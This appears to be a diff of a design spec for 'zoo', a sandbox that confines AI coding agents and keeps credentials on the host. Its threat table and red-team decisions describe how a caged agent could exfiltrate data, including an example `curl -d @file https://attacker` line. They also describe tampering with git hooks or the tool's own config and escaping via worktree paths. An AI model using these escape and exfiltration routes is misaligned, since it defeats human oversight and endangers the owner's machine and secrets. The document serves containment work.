@@ -81,7 +81,7 @@ Primary user: one developer running several agents in parallel across worktrees.
 - Making the agent's *output* safe. zoo protects the machine and its secrets, not the correctness of code the agent writes.
 - Replacing a harness's own permission prompts. zoo is the layer underneath.
 - Multi-tenant hosting for untrusted strangers.
-- TLS interception of agent traffic (no MITM CA in cages). Hostname-level control via `CONNECT` is the design.
+- TLS interception of agent traffic in general. Hostname-level control via `CONNECT` is the design. The one exception (D29): hosts the human puts under `credentials:` are decrypted in the keeper so it can add a token the cage never sees and enforce a policy, with a per-install CA name-constrained to exactly those hosts.
 
 ---
 
@@ -116,7 +116,10 @@ Every backend, every release. The escape suite (section 16.3) tests these. If a 
 | Exfiltration | `curl -d @file https://attacker` | I1, I3, I4; bytes-out alerts |
 | Exfil via allowed host | post code to a gist with the attacker's own GitHub token | Narrowed by allowlist; detected by per-host bytes-out alert and request log. **Not prevented.** |
 | DNS exfil | encode data in lookups | I1 (no resolver in cage); DNS attempts logged as a signal (M8) |
-| Host tampering | plant a git hook or `core.fsmonitor` that runs on the host | I7 |
+| Host tampering | plant a git hook or `core.fsmonitor` that runs on the host | I7; worktree paths named by git config read-only (D26) |
+| Config tampering | edit `zoo.yaml` to grant itself services, unmask secrets or add mounts | only a human-approved copy is used (D25) |
+| Pre-existing payload | a downloaded repo ships `.git/hooks/pre-commit` | listed at cage creation and in doctor (D26); detection only |
+| Credential theft | read `GH_TOKEN` and use it elsewhere | with `credentials:`, the cage holds a placeholder bound by HMAC to it (D29) |
 | Persistence | poison shell rc, harness settings, caches for the next session | ephemeral guest home and root; `zoo reset`; shared caches read-only or per-project |
 | Resource abuse | mining, fork bomb, fill disk | I9, alerts on sustained limits |
 | Lateral movement | reach the host's services or other cages | separate networks per cage group; host-port exposure check in doctor |
@@ -702,7 +705,8 @@ Config is validated on load with clear errors (path + key + expected).
 ### 13.3 Doors
 
 - **Shims** (v0): `~/.zoo/shims/<harness>`; `ZOO=off` bypass; inside a cage (`ZOO_INSIDE`) they exec the real binary.
-- **SSH** (M6): per cage, an sshd in the guest bound to the cage network, reached from the host through a forwarded loopback port managed by zood; per-cage ed25519 key in `~/.zoo/ssh/`; `~/.ssh/config.d/zoo` entries `Host zoo-<cage>` (include line added only with consent). Users: `agent` (and `agent-<n>` for shared cages). Must not open any path from the cage to the host.
+- **SSH** (M6, D31): `ssh zoo-<cage>` with `ProxyCommand zoo ssh-proxy <cage>`, which runs `sshd -i` as `agent` over the backend's exec: no listener anywhere. Key in `~/.zoo/ssh/`, entries in `~/.zoo/ssh/config` (the user adds the `Include`). Must not open any path from the cage to the host.
+- **Previews** (D32): `http://[<port>.]<cage>.localhost:<preview_port>` proxied by zood over exec.
 - **Direct**: `zoo run`, `zoo shell`.
 
 ### 13.4 Integration guides (write one page each under `docs/integrations/`)
@@ -841,6 +845,16 @@ Append new decisions at the bottom. Format: `D<n> (date): decision — why — a
 - **D22 (2026-10-28): The SSH agent proxy refuses signs with no `session-bind` when a service restricts hosts.** Means OpenSSH ≥ 8.9 in the cage (Debian bookworm has 9.2) and no commit signing on host-restricted keys; unrestricted keys still sign. Every list/sign is logged; private keys never leave the host agent.
 - **D23 (2026-10-28): Docker internal networks get no host address** (`inhibit_ipv4`). Found by the escape suite in CI: on Linux, the bridge gateway is the host, reachable on every port it listens on. Existing zoo networks are replaced when unused.
 - **D24 (2026-11-02): Red-team fixes. No learn mode; private destinations refused; the git guard covers every worktree and submodule; planted repositories are detected on the host.** (a) Learn mode allowed any destination, including `host.docker.internal` (the host's loopback on Docker Desktop and OrbStack), the LAN and cloud metadata; the owner prefers approving each host by hand, so it's gone and `zoo blocked` lists the queue. (b) squid denies private, loopback, link-local, CGNAT (tailnets) and multicast addresses, and `.localhost`/`.internal`/`.local` names, before the allowlist, so an allowlisted name resolving to a private address is refused. `::ffff:0:0/96` and `::/128` are deliberately absent: squid stores IPv4 as v4-mapped, so they read as 0.0.0.0/0. (c) `.git/worktrees` and `.git/modules` (and a linked worktree's own `modules/`) are read-only, with this worktree's own gitdir reopened rw on top (`CageSpec.ReopenRW`; mount order ro dirs, reopened dirs, ro files). Before, a cage could rewrite another worktree's `commondir` or a submodule's config and the host's git would run what it pointed at. An empty `config.worktree` is created so it can be mounted ro. (d) Mounts can't stop the agent writing `sub/.git`, a `.git` file pointing at its own git dir (under a forged gitlink, `git status` at the top level recurses into it) or a bare repo, any of which bring a config the host's git, prompt or editor would honour. `cage.GitTraps` finds them on the host: after each `zoo run` session, every 30 s in the daemon (critical alert), and in `zoo doctor` (fails). Detection, not prevention; `safe.bareRepository=explicit` closes the bare variant. Images bumped to m3 so existing cages are recreated with the new mounts.
+- **D25 (2026-11-07): `zoo.yaml` applies only once a human approves it.** It lives in the agent-writable worktree, and the daemon read `services:` live, so an agent could grant its cage any configured service (or unmask secrets / add mounts for the next cage) by editing it. The approved copy lives in `~/.zoo/trust/<hash>.json`; `zoo run` on a TTY shows a diff and asks; otherwise the approved copy stays in force with a warning; `zoo trust` approves. Deleting the file is a change too (it would drop extra masks). Rejected: mounting `zoo.yaml` read-only (the agent can still create it when absent).
+- **D26 (2026-11-07): Hooks and command-running git config are reported; worktree paths they name are read-only.** `cage.HostGitRisks` lists non-sample hooks and keys like `core.fsmonitor`, `core.hooksPath`, `filter.*`, `include.path` at cage creation and in doctor (a repo can arrive with a payload: detection only). `core.hooksPath=.husky`, included config files and filter scripts that point into the worktree would run agent-written code on the host, so they're added to `ReadOnly` (a missing hooks dir is created first). Cost: husky's install step can't write `.husky/_` inside a cage.
+- **D27 (2026-11-07): `git: rw | ro | none`, and several worktrees per cage.** `ro` mounts the git dir read-only; `none` covers it with an empty read-only dir (`~/.zoo/empty-dir`) and masks a linked worktree's `.git` file. `zoo.yaml mounts:` adds worktrees, each guarded by the same `guardGit` and masks; mounts can't be `/`, `$HOME`, a parent of the worktree or overlap `~/.ssh`, `~/.aws`, `~/.config`, `~/Library` and similar. Cages carry `zoo.layout` (hash of mounts and guard paths): a stopped cage whose layout changed is recreated, a running one gets a note.
+- **D28 (2026-11-07): Grants and allows can expire.** `--for 30m|4h|2d` on `zoo allow` and `zoo grant`, and from the dashboard. Expiries live beside the allowlist/grants (`allow-expiry.json`, `grant-expiry.json`); an expired grant stops counting at once (LoadGrants drops it); zood (every 5 s) or the next `zoo run` removes lapsed entries and reloads squid. A temporary allow never shortens a permanent one.
+- **D29 (2026-11-07): Credentials stay on the host; the keeper decrypts only their hosts.** Supersedes the TLS non-goal for hosts listed under `credentials:`. Cages get `<prefix>zoocred.<cred>.<cage>.<hmac>`; squid sends those hosts' CONNECTs to `cache_peer 127.0.0.1:3129` (an injector in zoo-gate, stdlib only), which presents a leaf from a per-install CA whose `PermittedDNSDomains` (critical) are exactly the credential hosts, checks the Host header matches the CONNECT, enforces policy (`readonly`: GET/HEAD/OPTIONS, git-upload-pack, LFS download, GraphQL without a `mutation` keyword outside strings; `push`: receive-pack commands parsed from pkt-lines, refs matched against `refs/heads/<pattern>`; `repos`: GitHub-style paths), swaps placeholders (also inside Basic auth) for values zood returns over the host bridge (`ZOO1 <token> @cred <placeholder>`: HMAC valid, cage running, grant held, value from Keychain/vault, cached 5 min in zood and 1 min in the keeper), and re-encrypts with system roots, refusing private addresses. Policy applies to every request to those hosts, with or without a credential, which also closes exfiltration through them with an attacker's token. Cages trust the CA via the system store plus `NODE_EXTRA_CA_CERTS`/`SSL_CERT_FILE`/`REQUESTS_CA_BUNDLE`; git gets a root-owned credential helper and https rewrites. Harnesses opt in with `cred:<name>` env values; built-in `claude`/`codex` definitions stay dormant until used. Rejected: squid `ssl_bump` + `request_header_add` (secrets in squid.conf, no placeholder binding, no git-aware policy); bumping everything (privacy, breaks pinned clients).
+- **D30 (2026-11-07): Doctor probes private reachability; the gate checks the arrival network.** `zoo doctor --deep` scans the cage's /24 and well-known private/metadata/Tailscale addresses directly and through the keeper; `--json` emits one `{verdict,check,detail}` per line. Every run checks interfaces (only lo plus the cage's own; tunnel devices the kernel creates are allowed while down) and default routes (WARN where the host gateway is expected). `gate.json` services carry `via` (cage IP → keeper IP on that cage's network); a connection arriving on another keeper address is refused. The Docker keeper runs with `rp_filter=1`. Defence in depth: cages can't open raw sockets.
+- **D31 (2026-11-07): The SSH door has no listener.** Replaces 13.3's sshd-on-the-network design: `ProxyCommand zoo ssh-proxy <cage>` runs `sshd -i` as `agent` over the backend's exec. Root-owned `/etc/zoo/{sshd_config,authorized_keys,sshd_env.conf}`; agent/X11/remote/socket forwarding refused, local forwarding allowed (editors need it); session env via `SetEnv` with no harness credentials; zoo writes `~/.zoo/ssh/config`, the user adds the `Include`.
+- **D32 (2026-11-07): Previews go over exec too.** zood serves `http://[<port>.]<cage>.localhost:<preview_port>` (default port+2, loopback only, Host must name a running cage) by running socat (bash `/dev/tcp` fallback) in the cage per connection, so it works where the host can't route to cages. Listening ports come from `/proc/net/tcp{,6}` every 10 s.
+- **D33 (2026-11-07): Package caches per cage by default; shared only by choice, and read-write.** `~/.zoo/cache/project/<cage>` mounted rw at `/home/agent/.zoo-cache`, surviving `zoo reset`; `cache: shared` mounts one dir into every cage that opts in, read-write (package managers can't use a read-only cache), with a warning at creation that one cage can poison another's installs. Supersedes "shared caches read-only" in 4 and 10.2. Tools are pointed at it by session env only for cages labelled `zoo.cache`. Rejected: mounting the host's own caches (I5); one shared cache by default.
+- **D34 (2026-11-07): Bring-your-own images are an overlay on the user's image; Dockerfiles build only once approved, with an empty context.** The overlay continues the user's final stage (some builders can't see local intermediate images). The tag hashes base, Dockerfile, overlay sources, uid/gid and zoo's cage tag; the `zoo.image` check recreates stopped cages. Approval stores the Dockerfile's hash and content per worktree; a change keeps the old image until `zoo build --project`. Rejected: building with the worktree as context (bakes in masked secrets) and auto-building on change (RUN steps have network outside the keeper).
 - **D16 (2026-10-28): `zoo up --backend X --isolation-floor Y` is remembered in `~/.zoo/state.json`** so later commands and the daemon agree; a plain `zoo up` clears the remembered floor. Precedence: flag > env (`ZOO_BACKEND`, `ZOO_ISOLATION_FLOOR`) > config `backend` (non-auto) > remembered > auto; floor: flag > env > remembered > config.
 
 ---
@@ -880,6 +894,12 @@ Run inside a cage as the agent user unless noted. Expected result in parentheses
 13. Host gateway port scan: report open ports (WARN, not FAIL, on Apple; FAIL on backends that claim `HostGatewayReachable=false`).
 14. (M5) Agent A can't read agent B's home/credentials.
 15. (M8) Sensor: `execve` of `curl` observed; killing sensor as root raises alert.
+16. No interfaces besides lo and the cage's own; no VPN/tun/wg/tailscale/zt (fail). No default route (fail; WARN on Apple).
+17. (`--deep`) Lateral scan of the cage's /24 (fail on per-cage networks; WARN on Apple).
+18. (`--deep`) Direct to 169.254.169.254, 100.100.100.100, common LAN gateways (fail).
+19. (`--deep`) Through the keeper to metadata, loopback, `[::1]`, RFC1918, host.docker.internal, metadata.google.internal (403 or no connection).
+20. Gate: a granted IP arriving on the wrong keeper address is denied and logged (unit); Docker keeper has rp_filter=1.
+21. Credential hosts: TLS through the keeper verifies against the cage's trust store (the keeper CA); `git: ro`/`none` hold.
 
 Output format stays `PASS|FAIL|WARN <check>: <detail>`; `zoo doctor --json` for CI.
 
@@ -902,14 +922,14 @@ Output format stays `PASS|FAIL|WARN <check>: <detail>`; `zoo doctor --json` for 
 
 Answer from evidence when you can; otherwise ask the human (see section 1).
 
-1. **Push default:** keep "agents commit, you push", or allow a single-repo push token so Orca/Conductor flows stay hands-off? (Asked in the spec doc; unanswered.)
+1. **Push default:** still "agents commit, you push" by default. Since D29 a `credentials:` entry can allow pushes to listed branches (`push: ["agent/*"]`) without the token entering the cage.
 2. **Apple `container` details:** answered for 1.6.1 in 6.4 and D11/D12 (list and inspect share one shape: `.id`, `.status.state`, `.configuration.labels`, `.status.networks[].{network,ipv4Address "x/24"}`; `--mount` rejects files, `-v` takes them; no CAP_SYS_ADMIN by default; keeper IP not stable). Open: vsock.
 3. **Docker internal networks:** OrbStack 29.8.2: embedded DNS answers container names but not external ones (SERVFAIL), with or without `--dns`; zoo still sets `--dns 127.0.0.1`. No default route. The internal network's gateway IP answers (RST) but leads only into the runtime's VM, not the Mac. `--ip` works on internal networks without `--subnet` (keeper pinning possible later). Linux Engine 28 (CI): the internal bridge's gateway address is the host itself, so host services on 0.0.0.0 (sshd) were reachable from cages; zoo now creates internal networks with `com.docker.network.bridge.inhibit_ipv4=true` (no host address; cages and the keeper need no gateway). Open: Docker Desktop, Podman/netavark (no equivalent option).
 4. **Conductor PATH:** does it inherit the login shell PATH so shims catch it, or need an explicit agent path?
 5. **Orca:** can `orca.yaml` launch agents through `zoo`? How is remote SSH configured?
 6. **Store:** DuckDB (cgo) vs SQLite pure-Go for cross-compilation simplicity.
 7. **Per-agent proxy auth:** do all target harnesses honor credentials in `HTTPS_PROXY`?
-8. **Shared caches:** per-project read-only caches vs none.
+8. **Shared caches:** see the caches decision (per-project by default, shared opt-in).
 9. **k8s worktree model:** clone-in-PVC + `zoo pull` vs syncing a working copy.
 10. **Name:** check `zoo` collisions before publishing.
 
@@ -963,6 +983,18 @@ Answer from evidence when you can; otherwise ask the human (see section 1).
 - [x] Dashboard: services, grants, connections, signs, approvals; minimal visual refresh
 - [x] Gate: passes on OrbStack and Apple 1.6.1 (host service on 127.0.0.1, sidecar, github.com:22, agent filtering, approvals on OrbStack, ungranted cage refused, escape suite PASS)
 
+**Thread pass (2026-11-07): feedback from other sandbox builders**
+- [x] `zoo.yaml` trust (D25)
+- [x] Hooks/config scan; worktree hook paths read-only (D26)
+- [x] `git: rw|ro|none`; `mounts:` (D27)
+- [x] Expiring grants and allows (D28)
+- [x] Credentials in the keeper; GitHub readonly/push/repos policy (D29). Unit-tested with a real TLS round trip; e2e on Docker: see changelog
+- [x] Doctor `--deep`/`--json`, interface check, gate anti-spoofing (D30)
+- [x] SSH door (D31): `needs-hw-verify` on Apple; Orca remote mode untested
+- [x] Previews (D32): Docker verified by agent with a throwaway container; Apple untested
+- [x] Package caches (D33), your own image (D34): overlay test-built on debian, python, alpine, node; real cage creation pending e2e
+- [x] Release: goreleaser, Homebrew tap, deb/rpm, cosign, provenance (human: tap repo, `HOMEBREW_TAP_TOKEN`, LICENSE)
+
 **M3: Store, service, API v1**
 - [ ] Store + retention + backfill
 - [ ] launchd/systemd service
@@ -981,7 +1013,7 @@ Answer from evidence when you can; otherwise ask the human (see section 1).
 - [ ] Gate
 
 **M6: SSH door + Docker-in-cage**
-- [ ] sshd per cage + ssh-config
+- [x] sshd per cage + ssh-config (D31: over exec, no listener)
 - [ ] Orca remote mode guide
 - [ ] Docker-in-cage on vm/microvm
 - [ ] Gate
@@ -1008,7 +1040,7 @@ Answer from evidence when you can; otherwise ask the human (see section 1).
 - [ ] Gate
 
 **M11: Release**
-- [ ] goreleaser, tap, signing (human), images (human)
+- [x] goreleaser, tap, signing (keyless cosign in CI); images (human)
 - [ ] Integration guides; SECURITY.md
 - [ ] Name check (human)
 - [ ] Gate
@@ -1019,6 +1051,7 @@ Answer from evidence when you can; otherwise ask the human (see section 1).
 - 2026-10-28: M0 verified on container 1.6.1. Fixed: in-guest masks/git guard silently failed (no CAP_SYS_ADMIN); squid -k reconfigure failed (squid was PID 1); `.git` rename bypassed the git guard; linked-worktree `.git` file and `commondir` were writable; IP-keyed learn mode leaked across cages on IP reuse; squid matched IP-literal CONNECTs by PTR name (now `dstdomain -n`).
 - 2026-10-28: M2S: services (host, sidecar, remote, ssh-agent), grants, gate, host bridge, SSH agent proxy, Bitwarden/1Password secret sources, per-cage networks on docker, dashboard refresh. Fixed: squid stale pid file wedged keeper restarts.
 - 2026-10-28: M1: `internal/backend` with `apple`, `docker`, `podman`; host-side guard on all backends; isolation floor; `zoo backend`, `zoo status`; escape suite PASS on OrbStack and Apple.
+- 2026-11-07: Thread pass (D25–D32): zoo.yaml trust; git risk scan and guarded hook paths; `git:` modes; multi-worktree cages; expiring grants/allows; credential injection with GitHub policy; doctor `--deep`/`--json`, interface check, gate `via` + rp_filter; SSH door over exec; preview URLs; package caches; bring-your-own images; release packaging. Images bumped to m4.
 - 2026-11-02: Red-team pass (D24): learn mode removed (`zoo blocked` instead); keeper refuses private destinations; git guard extended to all worktrees and submodules; host-side planted-repository detection in run, daemon and doctor. Squid config verified on bookworm squid; Linux unit and contract tests pass. Escape suite on Apple not yet re-run.
 
 ---
